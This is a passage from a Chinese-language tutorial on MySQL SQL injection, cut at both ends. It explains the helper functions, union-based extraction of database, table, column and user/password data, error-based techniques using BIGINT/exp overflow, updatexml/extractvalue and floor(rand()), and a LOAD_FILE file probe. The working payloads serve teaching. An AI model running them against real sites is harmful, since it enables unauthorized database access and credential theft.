class="line">information_schema的表columns中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列column_name记录了所有数据库的表的列的名字</span><br></pre></td></tr></table></figure><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="right、left函数"><a href="#right、left函数" class="headerlink" title="right、left函数"></a>right、left函数</h5><p><code>LEFT()</code>函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，<strong>我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数</strong>。</p><p>right同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">67890</span>                 |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">90</span>                    |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+----------------------+</span><br><span class="line">| <span class="number">12345</span>                |</span><br><span class="line">+----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="isnull-exp"><a href="#isnull-exp" class="headerlink" title="isnull(exp)"></a>isnull(exp)</h5><p>如果exp为null返回1，否侧返回0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select isnull(<span class="number">1</span>+<span class="number">1</span>);</span><br><span class="line">+-------------+</span><br><span class="line">| isnull(<span class="number">1</span>+<span class="number">1</span>) |</span><br><span class="line">+-------------+</span><br><span class="line">|           <span class="number">0</span> |</span><br><span class="line">+-------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select isnull(<span class="number">0</span>);</span><br><span class="line">+-----------+</span><br><span class="line">| isnull(<span class="number">0</span>) |</span><br><span class="line">+-----------+</span><br><span class="line">|         <span class="number">0</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>可以配合注入来判断文件是否存在以及是否有权限读取文件。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,isnull(LOAD_FILE(<span class="string">&#x27;/Users/apple/Desktop/2.txt&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~1~&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ifnull-expr1-expr2"><a href="#ifnull-expr1-expr2" class="headerlink" title="ifnull(expr1,expr2)"></a>ifnull(expr1,expr2)</h5><p>假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。</p><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><p>延时n秒，执行之后返回0。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| sleep(2) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        0 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">2.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="exists"><a href="#exists" class="headerlink" title="exists()"></a>exists()</h5><p>exists子句返回的结果并不是从数据库中取出的结果集，而是一个布尔值，如果子句查询到数据，那么返回true，反之返回false。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exists(select * from math);</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">| exists(<span class="keyword">select</span> * <span class="keyword">from</span> math) |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">|                          <span class="number">1</span> |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h4><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><p>二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><ul><li><p>按位或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>|<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>|<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>^<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>^<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位与</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>&amp;<span class="number">5464</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>&amp;<span class="number">5464</span> |</span><br><span class="line">+--------+</span><br><span class="line">|      <span class="number">0</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>0与任何的数字A按位或、异或都是A数字。</p><p>0与任何数字按位与都是0。</p><p>逻辑运算符</p><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><ul><li><p>与运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span>;</span><br><span class="line">+---------+</span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> |</span><br><span class="line">+---------+</span><br><span class="line">|       <span class="number">0</span> |</span><br><span class="line">+---------+    </span><br><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>;   </span><br><span class="line">+---------+     </span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> |      </span><br><span class="line">+---------+      </span><br><span class="line">|       <span class="number">1</span> |      </span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure></li><li><p>或运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br></pre></td></tr></table></figure></li><li><p>非运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">not</span> <span class="number">1</span>;</span><br><span class="line">  +-------+</span><br><span class="line">  | <span class="keyword">not</span> <span class="number">1</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  |     <span class="number">0</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select !<span class="number">0</span>;</span><br><span class="line">  +----+</span><br><span class="line">  | !<span class="number">0</span> |</span><br><span class="line">  +----+</span><br><span class="line">  |  <span class="number">1</span> |</span><br><span class="line">  +----+</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>原理：</p><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为<code>union</code>或<code>union all</code>。</p><p>条件：</p><p>页面有回显、有占位符</p><p>占位符：</p><p>从数据库中取出某些输入能够显示到页面上的某一个位置。</p><p>步骤：</p><ul><li><p>判断是否有注入</p></li><li><p>判断是数字型注入还是字符型注入</p></li><li><p>猜测查询列数</p><p>列数小,正常回显,num大,不回显。</p></li><li><p>寻找占位</p></li><li><p>获取所有数据库名</p></li><li><p>获取指定数据的所有表名</p></li><li><p>获取指定数据库的指定数据表的所有字段名</p></li><li><p>获取指定数据库的指定数据表的所有的内容</p></li></ul><h6 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h6><p>判断字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断显示位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库banner信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select version(),database()#</span></span><br></pre></td></tr></table></figure><p>判断数据库名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata–+</span><br></pre></td></tr></table></figure><p>判断数据库中的表名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断数据库中的表的列的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断字段内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><ul><li><p>BIGINT等数据类型溢出</p><ul><li><p>原理：</p><ul><li><p>在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。</p><p>在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>超出最大值就会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39;</span><br></pre></td></tr></table></figure></li><li><p>SQL注入利用</p><p>组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+!(select*from(select user())x);</span><br><span class="line">ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39;</span><br></pre></td></tr></table></figure><p>返回0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from(select user())x</span><br></pre></td></tr></table></figure><p>返回1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~0+!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x)-~0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0;</span><br></pre></td></tr></table></figure></li></ul><p>注意：</p><p>当MySQL版本大于或等于5.5.53时，数据溢出注入无效。</p></li><li><p>exp()函数：当传入的数值大于709的时候就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure></li><li><p>exp函数与整形溢出结合</p><ul><li><p>mysql&gt;5.5.53时，则不能返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.26    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(~(select * from (select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39;</span><br></pre></td></tr></table></figure></li><li><p>mysql5.5.47可以在报错中返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>xpath语法错误</p><ul><li><p>原理：</p><p>mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。</p><ul><li><p>updatexml()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XMLdocument, XPathstring, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39;</span><br></pre></td></tr></table></figure></li><li><p>extractvalue()对XML文档进行查询的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br><span class="line">第一个参数：可以传入目标xml文档</span><br><span class="line">第二个参数：用Xpath路径法表示的查找路径</span><br></pre></td></tr></table></figure><p>寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>主键重复</p><ul><li><p>基本函数</p><ul><li><p>rand()</p><p>rand()随机产生一个0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand();</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">| 0.006128073675677249 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+---------------------+</span><br><span class="line">| rand()              |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.33123136435750067 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>rand(0)产生一个固定的0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>有几条数据就会返回几条随机数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand() from math;</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">|   0.6377726314941167 |</span><br><span class="line">|   0.1951690951317261 |</span><br><span class="line">|  0.06252761190992558 |</span><br><span class="line">|   0.7271308048880946 |</span><br><span class="line">|  0.44807121944434125 |</span><br><span class="line">| 0.058963713291067366 |</span><br><span class="line">|   0.9506049388559581 |</span><br><span class="line">+----------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from math;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>floor()该函数返回X的最大整数值，但不能大于X</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(5.23);</span><br><span class="line">+-------------+</span><br><span class="line">| floor(5.23) |</span><br><span class="line">+-------------+</span><br><span class="line">|           5 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。</p><p><code>floor(rand(0)*2)</code>:具有确定性</p><p><code>floor(rand()*2)</code>:具有不确定性</p></li></ul></li><li><p>原理：</p><p>count()和group by在遇到rand()产生的重复值时报错。</p><p><code>Select name,count(*)  from student group by name</code>    </p><p>这条语句的作用就是从<code>student</code>表中<code>select</code>出<code>name</code>和<code>count</code>(count会具体返回一个数字).这个数字的多少就是根据<code>grop by</code> 后面的<code>name</code>来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。</p><p>重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？</p><p>发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 <code>key</code> ，一个是计数值 